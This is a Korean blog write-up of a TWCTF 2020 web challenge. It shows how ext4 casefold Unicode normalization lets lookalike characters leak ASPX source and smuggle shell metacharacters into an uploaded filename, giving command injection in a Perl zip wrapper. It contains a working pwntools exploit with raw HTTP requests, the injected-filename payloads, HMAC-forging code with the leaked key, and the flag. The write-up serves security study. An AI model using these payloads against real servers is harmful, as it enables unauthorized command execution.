---
layout: post
title:  "TWCTF2020 Does linux dream of windows"
author: "jskim"
comments: true
tags: [ctf, web]
---

라온화이트햇 핵심연구팀 김지섭

# Does linux dream of windows?

## Prelude

[dream-9449a15a278f55cec96e2567ac9a040299bcde2632a6ecb7c783a58c00191d80.7z](/assets/2020-10-01/dream-9449a15a278f55cec96e2567ac9a040299bcde2632a6ecb7c783a58c00191d80.7z)

[etc-9588be7d02beb61731dcdfd4590e13d1d4ba4a3527d4cb9f6786bde1071a6ed4.tar.gz](/assets/2020-10-01/etc-9588be7d02beb61731dcdfd4590e13d1d4ba4a3527d4cb9f6786bde1071a6ed4.tar.gz)

![/assets/2020-10-01/2010js.png](/assets/2020-10-01/2010js.png)

파일을 업로드하고 업로드한 파일을 리스팅할 수 있는 컨셉의 챌린지입니다. 특이한 기능이라면 기존에 업로드한 파일 이름을 압축(Compress)할 수 있는 기능이 존재했다는 점인데요. 해당 문제는 대회 시간 약 48시간 기준으로 단 1팀의 솔버만을 배출해냈고 이 마저도 unintended solution으로 풀려버린, 꽤 흥미로운 문제였습니다.

## Apache mod-mono-server

[mono/website](https://github.com/mono/website/blob/gh-pages/docs/web/mod_mono.md)

해당 문제의 환경은 `Linux + mono-server` 입니다. `mono-server`는 Apache 웹 엔진과 함께 리눅스에서 [ASP.NET](http://asp.NET) 코드를 실행시킬 수 있도록 돕는 모듈이며 실질적으로 [ASP.NET](http://asp.net) 을 핸들링하는 역할을 합니다. 

![/assets/2020-10-01/2010js1.png](/assets/2020-10-01/2010js1.png)

위 그림은 mod-mono-server의 동작 과정을 간단하게 요약한 그림입니다. 사용자의 http request가 들어오면 Apache worker 가 해당 요청을 mono-server로 그대로 전달해 줍니다. mod-server는 전달받은 request packet을 실질적으로 처리하고 그에 맞는 response를 다시 apache worker에 전송하여 사용자에게 전달합니다.

따라서 해당 문제 환경은 리눅스임에도 불구하고 mono-server 바이너리를 통해 aspx과 cs(C#)를 실행시킬 수 있었으며, 문제에 주어진 소스코드에서도 aspx와 cs 확장자를 확인할 수 있었습니다.

![/assets/2020-10-01/2010js2.png](/assets/2020-10-01/2010js2.png)

## Footprinting

upload.aspx 의 소스코드는 다음과 같습니다. 

![/assets/2020-10-01/2010js3.png](/assets/2020-10-01/2010js3.png)

해당 INDEX.HTM 를 눌러보면 놀랍게도 index.htm과 같은 결과를 반환합니다. 대회 당시에는 웹 페이지에 적혀있는 INDEX.HTM 이 무엇을 시사하는 지를 단번에 알아채지 못했으나 INDEX.HTM에 접속해도 index.htm 과 같은 결과를 반환한다는 것은 해당 파일 시스템이 case-insensitive 하다는 것을 의미합니다. 물론 윈도우에서 IIS를 통해 aspx를 호스팅 할 때도 case-insensitive하게 파일에 접근할 수 있지만 이는 윈도우 파일시스템이 본디 case-insensitive하기 때문입니다. 👀

![/assets/2020-10-01/2010js4.png](/assets/2020-10-01/2010js4.png)

case-insensitive한 windows filesystem

따라서 힌트로 제공된 /etc/fstab과 upload.aspx에서 볼 수 있는 대문자 INDEX.HTM 를 통해 /srv/www.img가 /var/www에 ext4로 마운트 되었음을 확인할 수 있고, 이를 통해 저희는 이 /var/www/에 마운트 된 파일 시스템이 case-insensitive 하다는 점을 추측해볼 수 있습니다.

```
LABEL=cloudimg-rootfs	/	 ext4	defaults	0 0
LABEL=UEFI	/boot/efi	vfat	defaults	0 0
/srv/www.img /var/www ext4 defaults 0 0
```

여기서 잠깐..... ext4는 linux의 고유 파일 시스템이며 대소문자를 완벽하게 구별하는 것으로 알고 계셨을텐데요. (cat flag와 cat FLAG는 다름)

이게 대체 어떻게 된 일일까요? 🤔

## casefolding 을 지원하는 ext4의 등장(!)

[Linux_5.2 - Linux Kernel Newbies](https://kernelnewbies.org/Linux_5.2#Optional_support_for_case-insensitive_names_in_ext4)

약간의 구글링 끝에 2019년 출시된 Linux 5.2 버전의 Ext4 파일 시스템에서 공식적으로 대소문자를 구분하지 않는, 최적화된 파일 이름을 조회하는 새로운 기능이 추가된 것을 확인할 수 있었습니다. 즉, ext4에서 `casefold`를 지원하는 옵션이 추가되었다는 말인데요. 커밋 로그를 잘 읽어보면 다음과 같은 내용이 존재합니다.

[ext4: Support case-insensitive file name lookups · torvalds/linux@b886ee3](https://github.com/torvalds/linux/commit/b886ee3e778ec2ad43e276fd378ab492cf6819b7)

```
A filesystem that has the casefold feature set is able to configure directories with the +F (EXT4_CASEFOLD_FL) attribute, enabling lookups to succeed in that directory in a case-insensitive fashion, i.e: match a directory entry even if the name used by userspace is not a byte per byte match with the disk name, but is an equivalent case-insensitive version of the Unicode string.  This operation is called a case-insensitive file name lookup.
```

`+F` 플래그를 통해 디렉토리에 `EXT4_CASEFOLD_FL` 속성을 추가해줄 수 있으며, 해당 F 속성이 추가된 디렉터리 내부에서는 대소문자를 구분하지 않는다고 합니다.  하지만 여기서 저희가 주목해야될 점은 바로 `case-insensitive version of unicode string` 인데요.  

이 사실을 알고난 뒤 문제를 풀이하기 위한 몇 가지 아이디어가 떠올랐습니다.

## casefolding test

일단 unicode casefolding에 관한 몇 가지 테스트를 진행해야 했습니다. 테스트를 위해 `/var/www/html` 경로에 test.php 파일을 생성하고 apache 모듈이 파일시스템의 영향을 받는지를 확인해 봅니다. unicode casefolding 을 테스트하기 위해서 unicode character database에 수록되어있는 casefolding case 중 `st`를 나타내는 글자를 찾았습니다.

[](https://www.unicode.org/Public/12.1.0/ucd/CaseFolding.txt)

```
FB06; F; 0073 0074; # LATIN SMALL LIGATURE ST
```

![/assets/2020-10-01/2010js5.png](/assets/2020-10-01/2010js5.png)

그런 다음, test.php가 아닌 `te\ufb06.php` 로 접근해봅니다.

![/assets/2020-10-01/2010js6.png](/assets/2020-10-01/2010js6.png)

when the webserver is mounted on non-casefold file system

일반적인 case-sensitive한 ext4 파일시스템에서는 정상적으로 라우팅이 이루어지지 않습니다. 하지만 casefold 옵션이 켜져있는 ext4 파일시스템은 과연 어떨까요?

테스트를 진행하기 위해 ext4 casefold를 지원하도록 파일 시스템을 마운트한 뒤, chattr 을 통해 html 경로에 +F 옵션을 주어 case-insensitive한 속성을 부여합니다.

![/assets/2020-10-01/2010js7.png](/assets/2020-10-01/2010js7.png)

그런 다음 똑같이 test.php가 아닌 `te\ufb06.php` 로 접근해봅니다.

![/assets/2020-10-01/2010js8.png](/assets/2020-10-01/2010js8.png)

when the webserver is mounted on ext4 casefold file system

놀랍게도 test.php로 접근이 됩니다. 이 말은 즉,  ext4 casefold 파일시스템에서는 파일 명을 byte per byte로 보지 않고, normalize된 unicode string과 일치하는 파일을 모두 같은 파일로 보겠다는 의미가 됩니다.

## Flag1

현재 문제에서 제공되는 서버 구성은 다음과 같습니다.

![/assets/2020-10-01/1.png](/assets/2020-10-01/1.png)

Apache 는 mod_mono_auto.confg 명시되어 있는 확장자를 기준으로 요청을 mono-server 넘겨줍니다. 

![/assets/2020-10-01/2010js9.png](/assets/2020-10-01/2010js9.png)

ucd를 참고하여 upload.aspx 이나 upload.aspx.cs 가 아닌 `upload.a\u017Fpx` 이나 `upload.a\u017Fpx.c\u017F` 이런 식으로 접근하게 되면 Apache에서는 해당 유니코드를 casefold 한 뒤 매치되는 파일을 골라 라우팅 할 것입니다. 

하지만 Apache의 AddType directive 는 unicode가 아닌 오직 ascii 레벨에서의 casefolding을 지원하기 때문에 결과적으로 upload.aspx가 mono-server를 거치지 않고 불려져 upload.aspx의 소스코드를 열람할 수 있게 됩니다.

![/assets/2020-10-01/2010js10.png](/assets/2020-10-01/2010js10.png)

## Flag2

파일을 올리고 압축하는 루틴에 command injection 취약점이 존재했습니다. 저희가 입력한 압축할 파일 명 `uploadedFilename` 이 $ARGV[0]에 직접적으로 들어가기 때문입니다.

```perl
#!/usr/bin/perl
#/bin/file-compressor
my $contentfile = $ARGV[0];
my $zipfile = $contentfile;
if ($zipfile =~ /.*\..*\z/) {
  $zipfile =~ s/(.*)\..*\z/$1.zip/;
} else {
  $zipfile .= ".zip";
}
print $zipfile;
`zip "$zipfile" "$contentfile"`; # <--- here
```

아래는 upload.aspx.cs의 코드 중 일부분입니다.

```csharp
protected void button1_OnClick(object sender, EventArgs e)
{
    var userDir = GetUserDir();
    if (!Directory.Exists(userDir)) {
        Directory.CreateDirectory(userDir);
    }
    if (!file1.HasFile) {
        label1.Text = "No file";
        return;
    }
    var filename = Sanitize(Path.GetFileName(filename1.Text));
    if (!SecurityCheck(filename)) {
        label1.Text = "Security Error";
        return;
    }
    file1.SaveAs(Path.Combine(userDir, filename));
    label1.Text = "Uploaded: " + filename;
    uploadedFilename.Value = filename;
    uploadedFilenameTag.Value = GenerateHmac(filename);
    button2.Enabled = true;
}

protected void button2_OnClick(object sender, EventArgs e)
{
    var filename = uploadedFilename.Value;
    if (!VerifyHmac(filename, uploadedFilenameTag.Value)) {
        label1.Text = "Security Error";
        return;
    }
    if (filename.Contains("/")) {
        label1.Text = "Security Error";
        return;
    }
    var userDir = GetUserDir();
    var filepath = Path.Combine(userDir, filename);
    if (!File.Exists(filepath)) {
        label1.Text = "Security Error: not exists";
        return;
    }

    var zipFilename = CompressFile(userDir, filename);
    label1.Text = "Compressed: " + zipFilename;

    File.Delete(filepath);
}

...
protected bool SecurityCheck(string filename)
    {
        string lower = filename.ToLower();
        if (lower.Contains(".aspx")) return false;
        if (lower.Contains(".asmx")) return false;
        if (lower.Contains(".ashx")) return false;
        if (lower.Contains(".asax")) return false;
        if (lower.Contains(".ascx")) return false;
        if (lower.Contains(".soap")) return false;
        if (lower.Contains(".rem")) return false;
        if (lower.Contains(".axd")) return false;
        if (lower.Contains(".cs")) return false;
        if (lower.Contains(".config")) return false;
        if (lower.Contains(".dll")) return false;
        if (lower.Contains(".php")) return false;
        if (lower.Contains(".phtml")) return false;
        if (lower.Contains(".shtml")) return false;
        if (lower.Contains(".cgi")) return false;
        return true;
    }
```

$ARGV[0]에 들어가는 인자 값은 최종적으로 compressFile 함수의 `filename`으로 들어가게 됩니다. 하지만 upload.aspx.cs 코드에 있는 `Exists()` 함수로 인해서 파일명에 `나 .. 같은 특수문자를 입력할 수 없었습니다. 또한 `SecurityCheck` 함수로 인해 웹쉘 업로드도 불가능해 보였죠. 

하지만 ext4 casefold 파일시스템은 casefold 뿐 만 아니라 normalize 된 파일명을 기준으로 파일명을 비교한다고 말씀드렸었는데요. 이는 ext4 casefold가 공식적으로 Unicode Normalization을 지원한다는 것을 의미합니다. 간단하게 말해서 NFD의 `A\u030a`와 NFC의 `\u00c5` 를 동등(equivalent) 하게 보겠다는 뜻이 됩니다.

![/assets/2020-10-01/2010js11.png](/assets/2020-10-01/2010js11.png)

![/assets/2020-10-01/2010js12.png](/assets/2020-10-01/2010js12.png)

마찬가지로 ascii에 매핑되는 unicode 케이스를 좀 더 조사하기 시작했고, ucd의 `NormalizationTest` 에서 shell command로 사용할 수 있을만한 몇 가지 흥미로운 케이스들을 찾을 수 있었습니다.

[](https://www.unicode.org/Public/12.1.0/ucd/NormalizationTest.txt)

```
037E;003B;003B;003B;003B; # (;; ;; ;; ;; ;; ) GREEK QUESTION MARK
1FEF;0060;0060;0060;0060; # (`; `; `; `; `; ) GREEK VARIA
226E;226E;003C 0338;226E;003C 0338; # (≮; ≮; <◌̸; ≮; <◌̸; ) NOT LESS-THAN
226F;226F;003E 0338;226F;003E 0338; # (≯; ≯; >◌̸; ≯; >◌̸; ) NOT GREATER-THAN
```

위에서부터 차례대로 ;, \`, <, > 총 네 가지 입니다. 세미콜론을 기준으로 NFC; NFD; NFKC; NFKD 순서이며 위와 마찬가지로 normalize 이후 `\u226e`와 `<\u0338` 는 동등해질 것입니다. 😉

![/assets/2020-10-01/2010js13.png](/assets/2020-10-01/2010js13.png)

이제 거의 다 왔습니다!

## Exploit

저희는 ;, \`, <, >  이렇게 총 4가지 쉘 커맨드를 사용할 수 있게 되었습니다. 이 4 가지 쉘 커맨드로 어떻게 쉘 명령어를 실행시킬 수 있을 지 몇 가지 테스트를 해봤는데요. 최종적으로 다음과 같은 페이로드를 통해 쉘 명령어 실행이 가능했습니다.

![/assets/2020-10-01/2010js14.png](/assets/2020-10-01/2010js14.png)

먼저 a에 실행시키고 싶은 쉘 명령어를 입력한 다음, sh에 리다이렉션 기호를 통해 a를 입력으로 주고, 그 다음 나온 아웃풋을 b로 주게 되면 명령어 실행이 가능합니다.

따라서 Exploit 시나리오는 다음과 같습니다.

1. 실행할 명령어를 담은 파일을 만들고 `\u0338a` 이라는 이름으로 업로드
2. `\u1FEFsh\u226Ea\u226Fb\u1FEF` 라는 dummy 파일 업로드
3. ``sh<\u0338a>\u0338b`` 압축

![/assets/2020-10-01/2010js15.png](/assets/2020-10-01/2010js15.png)

파일명을 `\u1FEFsh\u226Ea\u226Fb\u1FEF` 로 업로드하게 되면, unicode normalization로 인해 ``sh<\u0338a>\u0338b`` 도 동등하게 접근할 수 있게 되어, 압축할 때 ``sh<\u0338a>\u0338b`` 파일을 인자로 주게되면 최종적으로 다음과 같은 perl 스크립트가 완성됩니다.

```perl
zip "`sh<\u0338a>\u0338b`.zip" "`sh<\u0338a>\u0338b`"
```

하지만 압축된 파일명을 조작하기 위해서는 hmac key가 필요한데, 다행히 1번 취약점을 통해 손쉽게 hmac key를 추출해낼 수 있었습니다.

>> hmac : `5af42f71a1b864b7d2093336013508f8`

그 이후, 1번 취약점으로 얻은 hmac을 통해 원하는 파일 명을 file-decompressor의 $ARGV[0] 에 줄 수 있었고, 따라서 command injection 취약점을 발현시킬 수 있었습니다.

다음은 Exploit 코드입니다.

```python
from pwn import *

def upload(filename):
    p = remote('dream.chal.ctf.westerns.tokyo', 80)
    payload = u'''POST /upload.aspx HTTP/1.1
Host: dream.chal.ctf.westerns.tokyo
Connection: keep-alive
Content-Length: 1700
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dream.chal.ctf.westerns.tokyo
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZiSaf9FJ6PtAeIM5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dream.chal.ctf.westerns.tokyo/upload.aspx
Accept-Encoding: gzip, deflate
Accept-Language: ko,en-US;q=0.9,en;q=0.8,ko-KR;q=0.7
Cookie: ASP.NET_SessionId=AEDE0033A82E6358B8C052CA

------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="__VIEWSTATE"

/wEMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMwDjJWVIJvIW8qNp8fjXqX3h5GVcJ5o5Yra9F5KfHb
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="file1"; filename="test"
Content-Type: application/octet-stream

/get_flag2
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="filename1"

{}
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="button1"

Upload
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="uploadedFilename"

------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="uploadedFilenameTag"

xvvJTvo9RYTqWsgJMNLZLiEwoJ4eF5uR/hCW+FgYp6Y=
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEdAAEAAAD/////AQAAAAAAAAAPAQAAAAUAAAAIyd/IalikKYp4o/TJEB6bjEPD+b8LAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOTyO0VpwYzoHI+eXiWfAGvnzmaoGBHm77uPr8qGQH1E
------WebKitFormBoundaryZiSaf9FJ6PtAeIM5--'''.format(filename).replace('\n', '\r\n') + ' '*100
    p.send(payload)
    p.interactive()
    
def compress(filename, tag):
    p = remote('dream.chal.ctf.westerns.tokyo', 80)
    payload = u'''POST /upload.aspx HTTP/1.1
Host: dream.chal.ctf.westerns.tokyo
Connection: keep-alive
Content-Length: 1730
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dream.chal.ctf.westerns.tokyo
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycTTUhLx8GPsIrRrB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dream.chal.ctf.westerns.tokyo/upload.aspx
Accept-Encoding: gzip, deflate
Accept-Language: ko,en-US;q=0.9,en;q=0.8,ko-KR;q=0.7
Cookie: ASP.NET_SessionId=AEDE0033A82E6358B8C052CA

------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="__VIEWSTATE"

/wEMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMwDjJWVIJvIW8qNp8fjXqX3h5GVcJ5o5Yra9F5KfHb
------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="file1"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="filename1"

test
------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="uploadedFilename"

{filename}
------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="uploadedFilenameTag"

{tag}
------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="button2"

Compress
------WebKitFormBoundarycTTUhLx8GPsIrRrB
Content-Disposition: form-data; name="__EVENTVALIDATION"

/wEdAAEAAAD/////AQAAAAAAAAAPAQAAAAUAAAAIyd/IalikKYp4o/TJEB6bjEPD+b8LAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOTyO0VpwYzoHI+eXiWfAGvnzmaoGBHm77uPr8qGQH1E
------WebKitFormBoundarycTTUhLx8GPsIrRrB--'''.format(filename=filename, tag=tag).replace('\n', '\r\n') + ' '*100
    p.send(payload)
    p.interactive()

upload("\u0338a")
upload("\u1FEFsh\u226Ea\u226Fb\u1FEF")
compress("`sh<\u0338a>\u0338b`", "u15vKcAnJTc0p2SSfYLqs7XQzuSZfIj+uikBQ2S7lmc=")
```

FLAG : `TWCTF{c0e7d10abe93c98ec4c3025b498cd383_ext4_casefold+web_server=vuln!}`

### Appendix #1 - hmac 구하는 코드

```python
using System;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;

namespace Rextester
{

    public class Program
    {
        public static void Main(string[] args)
        {
			Console.WriteLine("\u1FEFsh<\u0338a>\u0338b\u1FEF");
            Console.WriteLine(GenerateHmac("\u1FEFsh<\u0338a>\u0338b\u1FEF"));
        }

        private static string keyEncryptionKeyHex =
            "aabad0f0a8fefae3eb8b032ab0c99627";

        private static int HexdigitToInteger(char c)
        {
            if ('0' <= c && c <= '9')
                return c - '0';
            else if ('a' <= c && c <= 'f')
                return c - 'a' + 10;
            else if ('A' <= c && c <= 'F')
                return c - 'A' + 10;
            else
                throw new ArgumentException("Invalid hex");
        }

        private static char IntegerToHexdigit(int x)
        {
            if (x < 0 || x >= 16)
                throw new ArgumentException("Out of range");
            else
                return "0123456789abcdef"[x];
        }

        private static byte[] HexToBytes(string hex)
        {
            if (hex.Length % 2 != 0) {
                throw new ArgumentException("Invalid hex");
            }
            byte[] result = new byte[hex.Length / 2];
            for (int i = 0; i < result.Length; i++) {
                result[i] = (byte)((HexdigitToInteger(hex[i * 2]) << 4) |
                                HexdigitToInteger(hex[i * 2 + 1]));
            }
            return result;
        }

        private static string BytesToHex(byte[] data)
        {
            var result = new StringBuilder();
            foreach (var b in data) {
                result.Append(IntegerToHexdigit(b >> 4));
                result.Append(IntegerToHexdigit(b & 0xf));
            }
            return result.ToString();
        }

        protected static byte[] DecryptKey(byte[] encryptedKey)
        {
            var keyEncryptionKey = HexToBytes(keyEncryptionKeyHex);
            using (var aes = new AesManaged()) {
                aes.BlockSize = 128;
                aes.KeySize = 128;
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;
                aes.Key = keyEncryptionKey;
                using (var decryptor = aes.CreateDecryptor()) {
                    return decryptor.TransformFinalBlock(encryptedKey, 0, 16);
                }
            }
        }

        protected static string GenerateHmac(string data)
        {
            var encryptedHmacKeyHex = "5af42f71a1b864b7d2093336013508f8";
            var encryptedHmacKey = HexToBytes(encryptedHmacKeyHex);
            var hmacKey = DecryptKey(encryptedHmacKey);

            var dataBytes = Encoding.UTF8.GetBytes(data);
            using (var hmac = new HMACSHA256(hmacKey))
            {
                var tagBytes = hmac.ComputeHash(dataBytes);
                var tagString = Convert.ToBase64String(tagBytes);
                return tagString;
            }
        }
    }
}
```

### Appendix #2 - ext4 linux manual page

[ext4(5) - Linux manual page](https://man7.org/linux/man-pages/man5/ext4.5.html)

```
casefold
              This ext4 feature provides file system level character
              encoding support for directories with the casefold (+F) flag
              enabled.  This feature is name-preserving on the disk, but it
              allows applications to lookup for a file in the file system
              using an encoding equivalent version of the file name.
```

[chattr(1) - Linux manual page](https://man7.org/linux/man-pages/man1/chattr.1.html)

```
The letters 'aAcCdDeFijPsStTu' select the new attributes for the
       files: append only (a), no atime updates (A), compressed (c), no copy
       on write (C), no dump (d), synchronous directory updates (D), extent
       format (e), case-insensitive directory lookups (F), immutable (i),
       data journalling (j), project hierarchy (P), secure deletion (s),
       synchronous updates (S), no tail-merging (t), top of directory
       hierarchy (T), and undeletable (u).
```